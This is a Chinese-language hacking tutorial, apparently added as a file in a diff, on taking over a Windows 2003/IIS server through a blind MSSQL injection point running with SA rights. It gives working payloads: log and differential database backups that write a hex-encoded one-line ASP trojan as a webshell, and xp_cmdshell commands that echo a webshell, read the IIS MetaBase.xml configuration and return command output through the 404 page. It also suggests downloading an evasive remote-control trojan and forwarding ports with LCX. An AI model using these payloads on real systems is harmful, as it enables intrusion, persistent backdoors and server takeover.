@@ -1,0 +1,139 @@
+
+内容：MSSQL注入SA权限不显错模式下的入侵
+
+
+一般新手扫到不显错的SA（systemadmin）的注入点时，虽然工具能猜表列目录但还是很麻烦有的人就直接放弃了，今天我给大家演示下如何利用。方法很简单大家看操作。
+
+我这里使用的是 火狐的插件提交参数。跟在浏览器里直接提交一样。
+
+
+这里的主机环境：MSSQL+JSP 权限为不显错的SA，支持多行执行 xp_cmdshell存活 服务器处于内网，WEB和数据库在同一台服务器上。注意这里服务器操作系统是windows2003，IIS，404页面的默认路径是 C:\Windows\Help\iisHelp\common\404b.htm。
+
+思路：
+
+首先：
+
+通过XP_CMDSHELL 执行命令再将执行结果指向IIS的404页面，然后访问WEB站点的一个不存在的目录得到命令执行结果，刺探服务器信息。
+
+1.日志备份获得Webshell
+
+2.数据库差异备份获得Webshell
+
+4.直接下载免杀远控木马。
+
+5.直接下载LCX将服务器端口转发出来
+
+6.通过XP_CMDSHELL 执行命令读取iis配置文件（C:\Windows\system32\inetsrv\MetaBase.xml ）分析查找WEB站点路径并在CMD下写入转义后的一句话获得WEBSHELL上传LCX将服务器转发出来。
+
+
+
+在这里我就不浪费大家时间了，我已经测试过  日志备份和 数据库差异备份 都没有成功 我就不演示了。  直接下载免杀木马。。这个也不用演示了。 直接在注入点后写入一个 DOWN 的VBS脚本下载就行了， 
+
+我直接演示后面一个方法
+
+
+分析查找WEB站点路径并在CMD下写入转义后的一句话获得WEBSHELL 
+
+
+
+
+◆日志备份：
+
+
+1. 进行初始备份
+; Alter Database TestDB Set Recovery Full Drop Table ttt Create Table ttt (a image) Backup Log TestDB to disk = '<e:\wwwroot\m.asp>' With Init--
+
+2. 插入数据
+;Insert Into ttt Values(0x253E3C256576616C2872657175657374286368722839372929293A726573706F6E73652E656E64253E)--
+
+0x253E3C256576616C2872657175657374286368722839372929293A726573706F6E73652E656E64253E   为 一句话木马 %><%eval(request(chr(97))):response.end%>
+  
+3. 备份并获得文件，删除临时表
+;Backup Log <数据库名> To Disk = '<e:\wwwroot\m.asp>';Drop Table ttt Alter Database TestDB Set Recovery SIMPLE--
+
+
+
+◆数据库差异备份
+
+（1. 进行差异备份准备工作
+
+;Declare @a Sysname;Set @a=db_name();Declare @file VarChar(400);Set @file=<0x633A5C746573742E617370>;Drop Table ttt Create Table ttt(c Image) Backup Database @a To Disk=@file--
+
+上面的 0x633A5C746573742E617370  是 c:\test.asp 路径转换后的16进制编码
+ 
+
+（2. 将数据写入到数据库
+;Insert Into ttt Values(0x253E3C256576616C2872657175657374286368722839372929293A726573706F6E73652E656E64253E)-- 
+
+0x253E3C256576616C2872657175657374286368722839372929293A726573706F6E73652E656E64253E   为 一句话木马 %><%eval(request(chr(97))):response.end%>
+
+3. 备份数据库并清理临时文件
+
+;Declare @b SysName;Set @b=db_name();Declare @file1 VarChar(400);Set @file1=<0x633A5C746573742E617370>;Backup Database @b To Disk=@file1 With Differential,Format;Drop Table ttt;--
+
+0x633A5C746573742E617370  为 c:\test.asp  删除临时文件 
+
+
+
+用^转义字符来写ASP(一句话木马)文件的方法:   
+
+1.注入点后执行;exec master.dbo.xp_cmdshell 'echo ^<script language=VBScript runat=server^>execute request^("90"^)^</script^> >c:\mu.asp';--
+
+2.CMD下执行 echo ^<%execute^(request^("l"^)^)%^> >c:\mu.asp 
+
+读取IIS配置信息获取web路径
+
+     
+     注入点后面执行   ;exec master..xp_cmdshell 'copy C:\Windows\system32\inetsrv\MetaBase.xml C:\Windows\Help\iisHelp\common\404b.htm'--
+
+执行命令
+     
+     注入点后面执行   ;exec master..xp_cmdshell 'ver >C:\Windows\Help\iisHelp\common\404b.htm'--
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
